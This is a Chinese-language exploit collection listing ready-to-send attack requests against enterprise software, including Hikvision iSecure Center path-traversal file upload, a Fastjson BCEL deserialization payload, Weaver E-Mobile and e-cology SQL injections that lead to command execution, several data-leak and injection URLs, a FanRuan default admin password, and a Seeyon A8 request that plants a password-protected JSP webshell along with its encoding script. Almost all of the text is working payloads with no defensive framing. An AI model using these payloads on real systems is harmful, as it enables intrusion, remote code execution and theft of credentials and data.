# Web漏洞

## 海康威视isecure center 综合安防管理平台存在任意文件上传漏洞

```
# 文件上传
POST /center/api/files;.js HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 257
Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c

--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt"
Content-Type: application/octet-stream

332299402
--ea26cdac4990498b32d7a95ce5a5135c--
# 上传以后访问/clusterMgr/153107606.txt;.js
```

## 海康威视综合安防Fastjson不出网利用

```
# Fastjson不出网利用目前公开的已知的poc有两个： 
# com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
# org.apache.tomcat.dbcp.dbcp2.BasicDataSource
# TemplatesImpl利用链有限制的。由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22-1.2.24
# 使用条件 
# 1. parseObject(input,Object.class,Feature.SupportNonPublicField)
# 2. parse(input,Feature.SupportNonPublicField)
# 第二种利用方式则需要应用部署在tomcat应用环境中，因为tomcat环境自带tomcat-dbcp.jar，而在tomcat中的 com.sun.org.apache.bcel.internal.util.ClassLoader 的loadclass方法中可以进行bcel字节码的加载。
# 以下是第二种方法的利用。
POST /bic/ssoService/v1/applyCT HTTP/1.1
Host: *
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Content-Length: 5727
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/json
Referer: *
Testcmd: whoami

{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A"}}
}
```

## 泛微E-Mobile 6.0 存在命令执行

```

POST /client.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Length: 1147

------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"

getupload
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="uploadID"

1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('whoami');--
------WebKitFormBoundaryTm8YXcJeyKDClbU7--
```

## 华夏erp账号密码泄露

```

/jshERP-boot/user/getAllList;.ico
```

## 孚盟云 SQL注入漏洞

```
/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1%27
```

## 泛微OA SQL注入漏洞

```
# 使用以下SQL注入语句获取密码，然后MD5解密登录系统。
/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

## 帆软报表获取管理员权限

```
# 访问URL后台，默认密码：admin/123456
/ReportServer?op=fr_auth&cmd=ah_loginui&_=1619832545582
```

## 用友GRP-U8行政事业财务管理软件 SQL注入

```
/Proxy

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

## 泛微e-cology V8 WorkflowServiceXml SQL注入

```
POST /services/WorkflowServiceXml HTTP/1.1
Cookie: ecology_JSessionid=aaaBARi23vekqguNfrVDy
Host: {{Hostname}}
Content-Type: text/xml;charset=UTF-8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20050920 Firefox/1.0.6

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
  <soapenv:Header/>
  <soapenv:Body>
      <web:getUserId>
    <web:string>loginId = ? ;*--</web:string>
<web:string>xx</web:string>
      </web:getUserId>
  </soapenv:Body>
</soapenv:Envelope>
```

## 致远 OA A8 htmlofficeservlet getshell 漏洞

```
/seeyon/htmlofficeservlet

DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd33445".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce

webshell地址为：https://www.0-sec.org/seeyon/test123456.jsp，密码为：asasd3344。

####DBSTEP V3.0编解码脚本
from sys import argv

letters = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"

def base64_encode(input_str):
    str_ascii_list = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', '')) for i in input_str]
    output_str = ''
    equal_num = 0
    while str_ascii_list:
        temp_list = str_ascii_list[:3]
        if len(temp_list) != 3:
            while len(temp_list) < 3:
                equal_num += 1
                temp_list += ['0' * 8]
        temp_str = ''.join(temp_list)
        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
        temp_str_list = [int(x, 2) for x in temp_str_list]
        if equal_num:
            temp_str_list = temp_str_list[0:4 - equal_num]
        output_str += ''.join([letters[x] for x in temp_str_list])
        str_ascii_list = str_ascii_list[3:]
    output_str = output_str + '=' * equal_num
    return output_str

def base64_decode(input_str):
    str_ascii_list = ['{:0>6}'.format(str(bin(letters.index(i))).replace('0b', '')) for i in input_str if i != '=']
    output_str = ''
    equal_num = input_str.count('=')
    while str_ascii_list:
        temp_list = str_ascii_list[:4]
        temp_str = ''.join(temp_list)
        if len(temp_str) % 8 != 0:
            temp_str = temp_str[0:-1 * equal_num * 2]
        temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]]
        temp_str_list = [int(x, 2) for x in temp_str_list if x]
        output_str += ''.join([chr(x) for x in temp_str_list])
        str_ascii_list = str_ascii_list[4:]
    return output_str

if __name__ == "__main__":
    if len(argv) == 2:
        print(base64_decode(argv[1]))
    elif len(argv) == 3:
        if argv[1] == '-d':
            print(base64_decode(argv[2]))
        else:
            print(base64_encode(argv[2]))
    else:
        print("Seeyon OA /seeyon/htmlofficeservlet param encode/decode")
        print("Usage:")
        print("python %s encoded_str" % argv[0])
        print("python %s -d encoded_str" % argv[0])
        print("python %s -e raw_str" % argv[0])
```

